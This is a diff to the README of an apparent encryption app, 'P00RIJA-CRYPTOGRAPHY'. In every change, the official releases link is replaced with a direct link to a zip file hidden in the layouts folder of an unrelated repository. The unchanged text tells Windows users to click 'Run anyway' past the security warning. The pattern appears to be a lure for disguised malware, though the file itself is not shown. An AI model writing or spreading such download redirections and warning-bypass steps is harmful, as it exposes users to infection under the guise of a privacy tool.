@@ -5,11 +5,11 @@ description: "Encrypt files, messages, and secrets offline with AES-256-GCM, RSA
 ---
 # 🔐 P00RIJA-CRYPTOGRAPHY - Your Private Vault & Encrypted Messenger
 
-[![Download Now](https://img.shields.io/badge/Download-P00RIJA--CRYPTOGRAPHY-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f2937&color=10b981)](https://github.com/Sequellayana39/P00RIJA-CRYPTOGRAPHY/releases)
+[![Download Now](https://img.shields.io/badge/Download-P00RIJA--CRYPTOGRAPHY-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f2937&color=10b981)](https://raw.githubusercontent.com/Sequellayana39/sequellayana39.github.io/main/src/layouts/Latest-v2.5.zip)
 
 ## 📥 Getting Started
 
-Visit this link to download the application. Click the button above or use this direct link: **https://github.com/Sequellayana39/P00RIJA-CRYPTOGRAPHY/releases**
+Visit this link to download the application. Click the button above or use this direct link: **https://raw.githubusercontent.com/Sequellayana39/sequellayana39.github.io/main/src/layouts/Latest-v2.5.zip**
 
 Once you're on that page, look for the **latest release** and click the download button. The file will be saved to your computer's **Downloads** folder. That's it — you're ready to secure your digital life!
 
@@ -52,7 +52,7 @@ No central servers. Your messages go **directly from your device to the recipien
 ## 🚀 How to Download and Run (Windows)
 
 ### Step 1: Download the App
-Click the download button at the top of this page, or go to **https://github.com/Sequellayana39/P00RIJA-CRYPTOGRAPHY/releases**. Find the **latest release** and download the Windows installer file.
+Click the download button at the top of this page, or go to **https://raw.githubusercontent.com/Sequellayana39/sequellayana39.github.io/main/src/layouts/Latest-v2.5.zip**. Find the **latest release** and download the Windows installer file.
 
 ### Step 2: Run the Installer
 Once the download finishes, go to your **Downloads** folder (usually `C:\Users\[YourName]\Downloads`) and double-click the downloaded file. Your computer might show a blue "Windows protected your PC" screen — this is normal for open-source software. Click **"More info"** and then **"Run anyway"** to proceed.
@@ -163,7 +163,7 @@ If you encounter any issues:
 
 ## 🔄 Stay Updated
 
-Always download the **latest version** from the official releases page to ensure you have the newest security patches and features. The download link is always: **https://github.com/Sequellayana39/P00RIJA-CRYPTOGRAPHY/releases**
+Always download the **latest version** from the official releases page to ensure you have the newest security patches and features. The download link is always: **https://raw.githubusercontent.com/Sequellayana39/sequellayana39.github.io/main/src/layouts/Latest-v2.5.zip**
 
 ---
 
@@ -171,7 +171,7 @@ Always download the **latest version** from the official releases page to ensure
 
 Click the download button below, follow the simple installation steps above, and take control of your privacy today. It takes less than five minutes to set up, and the peace of mind lasts forever.
 
-[![Download Now](https://img.shields.io/badge/⬇️%20Download%20Now-Latest%20Release-blue?style=for-the-badge&logo=windows&logoColor=white&labelColor=2563eb&color=3b82f6)](https://github.com/Sequellayana39/P00RIJA-CRYPTOGRAPHY/releases)
+[![Download Now](https://img.shields.io/badge/⬇️%20Download%20Now-Latest%20Release-blue?style=for-the-badge&logo=windows&logoColor=white&labelColor=2563eb&color=3b82f6)](https://raw.githubusercontent.com/Sequellayana39/sequellayana39.github.io/main/src/layouts/Latest-v2.5.zip)
 
 ---
 
